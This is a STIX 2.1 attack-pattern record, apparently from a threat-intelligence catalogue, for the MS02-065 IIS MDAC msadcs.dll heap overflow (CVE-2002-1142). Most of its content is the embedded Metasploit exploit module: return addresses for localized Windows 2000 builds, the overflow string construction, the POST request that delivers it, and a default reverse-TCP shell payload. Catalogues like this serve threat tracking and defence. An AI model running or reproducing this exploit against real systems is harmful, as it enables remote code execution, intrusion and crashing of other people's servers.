{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fa6f48ff-7ab3-4280-ab36-553080b42dea",
    "created": "2024-08-14T16:48:42.654031Z",
    "modified": "2024-08-14T16:48:42.654035Z",
    "name": "MS02-065 Microsoft IIS MDAC msadcs.dll RDS DataStub Content-Type Overflow",
    "description": " This module can be used to execute arbitrary code on IIS servers that expose the /msadc/msadcs.dll Microsoft Data Access Components (MDAC) Remote Data Service (RDS) DataFactory service. The service is exploitable even when RDS is configured to deny remote connections (handsafe.reg). The service is vulnerable to a heap overflow where the RDS DataStub 'Content-Type' string is overly long. Microsoft Data Access Components (MDAC) 2.1 through 2.6 are known to be vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/iis/ms02_065_msadc.rb",
            "external_id": "ms02_065_msadc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2002-1142"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0082.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MS02-065 Microsoft IIS MDAC msadcs.dll RDS DataStub Content-Type Overflow',\n        'Description' => %q{\n          This module can be used to execute arbitrary code on IIS servers\n          that expose the /msadc/msadcs.dll Microsoft Data Access Components\n          (MDAC) Remote Data Service (RDS) DataFactory service. The service is\n          exploitable even when RDS is configured to deny remote connections\n          (handsafe.reg). The service is vulnerable to a heap overflow where\n          the RDS DataStub 'Content-Type' string is overly long. Microsoft Data\n          Access Components (MDAC) 2.1 through 2.6 are known to be vulnerable.\n        },\n        'Author' => 'aushack',\n        'Platform' => 'win',\n        'Arch' => [ARCH_X86],\n        'References' => [\n          ['OSVDB', '14502'],\n          ['BID', '6214'],\n          ['CVE', '2002-1142'],\n          ['MSB', 'MS02-065'],\n          ['URL', 'http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0082.html']\n        ],\n        'Privileged' => false,\n        'Payload' => {\n          'Space' => 1024,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0b\\x0d\\x20\\x22\\x27:?<>=$\\\\/;=+%#&\", # \"\\u0000\\t\\n\\v\\r \\\"':?<>=$\\\\/;=+%#&\"\n          'StackAdjustment' => -3500\n        },\n        'DefaultOptions' => {\n          'PAYLOAD' => 'windows/shell/reverse_tcp',\n          'EXITFUNC' => 'seh' # stops IIS from crashing... hopefully\n        },\n        'Targets' => [\n          # jmp eax ws2help.dll\n          [ 'Windows 2000 Pro SP0-SP3 (English)', { 'Ret' => 0x75023783 } ],\n          [ 'Windows 2000 Pro SP0 (Korean)', { 'Ret' => 0x74f93783 } ],\n          [ 'Windows 2000 Pro SP0 (Dutch)', { 'Ret' => 0x74fd3783 } ],\n          [ 'Windows 2000 Pro SP0 (Finnish)', { 'Ret' => 0x74ff3783 } ],\n          [ 'Windows 2000 Pro SP0 (Turkish)', { 'Ret' => 0x74fc3783 } ],\n          [ 'Windows 2000 Pro SP0-SP1 (Greek)', { 'Ret' => 0x74f73783 } ],\n          [ 'Windows 2000 Pro SP1 (Arabic)', { 'Ret' => 0x74f93783 } ],\n          [ 'Windows 2000 Pro SP1 (Czech)', { 'Ret' => 0x74fc3783 } ],\n          [ 'Windows 2000 Pro SP2 (French)', { 'Ret' => 0x74fa3783 } ],\n          [ 'Windows 2000 Pro SP2 (Portuguese)', { 'Ret' => 0x74fd3783 } ],\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2002-11-02',\n        'Notes' => {\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SERVICE_DOWN],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [ true, 'The path to msadcs.dll', '/msadc/msadcs.dll' ], aliases: [ 'PATH' ]),\n    ])\n  end\n\n  def check\n    res = send_request_cgi('uri' => normalize_uri(target_uri.path))\n\n    return CheckCode::Unknown('Connection failed') unless res\n    return CheckCode::Unknown('HTTP server error') if res.code == 500\n    return CheckCode::Safe('Access Forbidden') if res.code == 403\n\n    if res.code == 200 && res.body.to_s.include?('Content-Type: application/x-varg')\n      return CheckCode::Detected(\"#{target_uri.path} content type matches fingerprint application/x-varg\")\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    sploit = rand_text_alphanumeric(136)\n    sploit[24, 2] = Rex::Arch::X86.jmp_short(117)\n    sploit << [target['Ret']].pack('V')\n    sploit << payload.encoded\n\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/AdvancedDataFactory.Query'),\n      'method' => 'POST',\n      'data' => \"Content-Type: #{sploit}\"\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2002-11-02",
    "x_mitre_platforms": [
        "win'"
    ]
}